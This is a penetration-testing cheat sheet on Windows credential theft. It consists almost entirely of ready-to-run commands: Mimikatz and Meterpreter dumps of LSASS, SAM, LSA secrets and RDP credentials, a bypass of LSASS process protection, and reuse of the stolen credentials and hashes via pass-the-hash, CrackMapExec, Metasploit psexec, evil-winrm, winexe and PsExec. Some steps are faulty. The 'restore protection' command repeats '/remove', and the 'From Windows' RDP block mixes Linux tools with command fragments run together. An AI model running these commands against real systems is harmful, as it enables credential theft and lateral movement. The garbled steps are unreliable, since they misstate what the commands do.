# Windows Credential Access

## Credential Dumping

Credential dumping is a crucial phase in post-exploitation activities during a penetration test or security assessment. This cheat sheet provides a collection of techniques and commands for extracting credentials from compromised systems.

### Extract Clear-text Passwords & Hashes from Memory with Mimikatz

***

Execute Mimikatz

```jsx
mimikatz.exe
```

Extract Passwords:

```bash
privilege::debug sekurlsa::logonpasswords
```

Via Meterpreter Mimikatz Module

```bash
load kiwi getsystem Creds_msv
```

### Extract Clear-text Passwords & Hashes via Metasploit

***

Once with a Meterpreter Shell

Migrate to a stable process

```bash
migrate PROCESS
```

Escalate Privileges if possible

```bash
getsystem
```

Dump Hashes

```bash
post/windows/gather/hashdump 
post/windows/gather/smart_hashdump
```

### Dump RDP Credentials

***

Execute Mimikatz

```bash
mimikatz.exe
```

Extract RDP Credentials

```bash
privilege::debug ts::mstsc
```

### Dump SAM Database

***

Execute Mimikatz

```bash
mimikatz.exe
```

Extract SAM Database

```bash
privilege::debug lsadump::sam
```

### Dump LSA Secrets

***

Execute Mimikatz

```bash
mimikatz.exe
```

Dump LSA Secrets

```bash
privilege::debug lsadump::secrets
```

### LSA Protection Bypass

***

Check if LSA runs as a protected process by looking for the variable "RunAsPPL":

```bash
reg query HKLM\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa
```

Upload the `mimidriver.sys` from the official Mimikatz repository to the same folder as your `mimikatz.exe`.

Import the `mimidriver.sys` to the system:

```bash
mimikatz # !+
```

Remove the protection flags from `lsass.exe` process:

```bash
mimikatz # !processprotect /process:lsass.exe /remove
```

Run the logonpasswords function to dump `lsass`:

```bash
mimikatz # privilege::debug mimikatz # token::elevate mimikatz # sekurlsa::logonpasswords
```

Re-add the protection flags to the `lsass.exe` process:

```bash
mimikatz # !processprotect /process:lsass.exe /remove
```

Unload the service created:

```bash
mimikatz # !-
```

### Using Credentials with RDP

***

**From Kali**

```bash
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:MACHINE_IP /u:Administrator /p:'pASSWORD'
```

**From Windows**

```bash
rdesktop -u username -p password -g 85% -r disk:share=/root/ xfreerdp /u: /p:lab /v: proxychains 
xfreerdp /d:sandbox /u:alex /v:10.5.5.20 +clipboard
```

### Using Pass the Hash with Mimikatz

***

Execute Mimikatz

```bash
mimikatz.exe
```

Pass the hash

```bash
privilege::debug sekurlsa::pth /user:user_name /domain:domain /ntlm:ntlm /run:powershell
```

### Using Pass the Hash with CrackMapExec

***

```bash
crackmapexec.exe domain -u user_name -H ntlm -x command
```

### Using Credentials with Runas

***

**From Windows**

```bash
PS C:\\\\> runas /netonly /user:DOMAIN\\\\username "cmd.exe" 
PS C:\\\\> runas /noprofil /netonly /user:DOMAIN\\\\username cmd.exe
```

### Using Credentials with Metasploit SMB

***

```bash
use auxiliary/scanner/smb/smb_login 
set SMBDomain DOMAIN 
set SMBUser username 
set SMBPass password 
services -p 445 -R run creds
```

### Using Credentials with Metasploit Psexec

***

The password can be replaced by a hash to execute a pass-the-hash attack.

```bash
use exploit/windows/smb/psexec 
set RHOST 10.2.0.3 
set SMBUser username 
set SMBPass password 
set SMBPass e52cac67419a9a224a3b108f3fa6cb6d:8846f7eaee8fb117ad06bdd830b7586c 
set PAYLOAD windows/meterpreter/bind_tcp run shell
```

### Using Credentials with Evil-winrm

***

**From Kali using Pass the Hash attack**

```bash
evil-winrm -i 10.10.200.193 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

**From Kali using credentials**

```bash
evil-winrm -i 10.10.200.193 -u Administrator -p 'MySuperSecr3tPass123!'
```

### Using Credentials with WINEXE

***

**From Kali Linux**

```bash
winexe -U DOMAIN/username%password //10.10.10.10 cmd.exe
```

### Using Credentials with [psexec.py](http://psexec.py)

***

**From Kali Linux**

```bash
python psexec.py DOMAIN/username:password@10.10.10.10
python smbexec.py DOMAIN/username:password@10.10.10.10
```

### Using Credentials with PsExec

***

**From Windows**

```bash
PS C:\\\\> PsExec.exe \\\\\\\\IP -u DOMAIN\\\\username -p password ipconfig PS C:\\\\> PsExec.exe \\\\\\\\IP -u DOMAIN\\\\username -p password cmd.exe
```
